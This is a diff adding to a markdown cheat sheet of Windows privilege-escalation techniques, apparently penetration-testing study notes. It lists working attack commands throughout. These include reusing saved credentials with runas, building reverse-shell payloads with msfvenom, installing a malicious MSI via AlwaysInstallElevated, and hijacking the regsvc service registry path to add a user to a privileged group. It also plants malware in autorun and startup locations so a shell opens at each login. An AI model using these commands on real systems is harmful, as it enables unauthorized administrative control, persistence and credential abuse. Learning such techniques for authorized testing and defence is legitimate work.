@@ -237,3 +237,91 @@ Could crash a machine, so be careful!
 Allows us to run a command as someone else.
 
 Look for stored credentials: `cmdkey /list`
+- Use `runas.exe` to download files
+  - `C:\Windows\System32\runas.exe /user:[user] /savecred "C:\Windows\System32\cmd.exe /c TYPE [file directory] > [output directory]"`
+- This effectively gives you a `sudo` command on the machine.
+
+In ftp: `binary` when having issues transferring files
+
+To read .mdb: `mdb-sql [file]`
+
+To read .pst: `readpst [file]`
+
+Enumerate to find credentials.
+
+Use telnet: `telnet -l [username] [ip]`
+
+## Escalation Path: Registry
+
+### Autorun
+
+In RDP:
+- `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe`
+- Check for access: 
+  - ` C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "[path to file]"`
+
+In shell:
+- PowerUp
+  - `powershell -ep bypass`
+  - `. .\PowerUp.ps1`
+  - Invoke-AllChecks
+
+Changing shell
+- `use multi/handler`
+- `msfvenom -p [payload] LHOST=[ip] LPORT=[port] -f [filetype] -o [output file]`
+- Upload the malware to target device
+- Use the malware from target device
+
+Move the malware onto the machine and put it in the location of the autorun program.
+
+Whenever a user logs in we gain a shell.
+
+### AlwaysInstallElevated
+
+Sometimes Windows MSI files have AlwaysInstallElevated set to 1.
+- `reg query HKLM\Software\Policies\Microsoft\Windows\Installer`
+- `reg query HKCU\Software\Policies\Microsoft\Windows\Installer`
+
+In PowerUp (RDP required):
+- Detects AlwaysInstallElevated running and gives a command to automatically create malicious MSI.
+
+Through msfvenom.
+- `msfvenom -p [payload] LHOST=[ip] LPORT=[port] -f msi -o [output file]`
+- Upload shell to machine
+- `msiexec /quiet /qn /i [path to malicious MSI file]`
+
+In meterpreter shell:
+- `use post/exploit/windows/local/allways_install_elevated`
+
+### regsvc ACL
+
+FTP Server
+- `python3 -m pyftpdlib -p 21 --write`
+
+Powershell: `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`
+- Requires: `NT AUTHORITY\INTERACTIVE Allow FullControl`
+
+Exploitation:
+- Add `cmd.exe /k net localgroup [group] [user] /add` to a service file
+- `x86_64-w64-mingw32-gcc [service file] -o x.exe`
+  - If not installed `sudo apt install gcc-mingw-w64`
+- Put the service file in a writeable folder on the target
+- `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d [path to service file] /f`
+- `sc start regsvc`
+
+## Escalation Path: Executable Files
+
+Run PowerUp.
+
+Exploitation:
+- Download malicious file onto the system by replacing it with the target executable file
+- `sc start [service]`
+- *Recommended to use malware that adds user to a group or creates a new privileged user instead of a shell, since the shell dies when the service starter times out.*
+
+## Escalation Path: Startup Applications
+
+To detect: `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`
+- **F** means Full Access
+
+Exploit:
+- Download malware to `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`
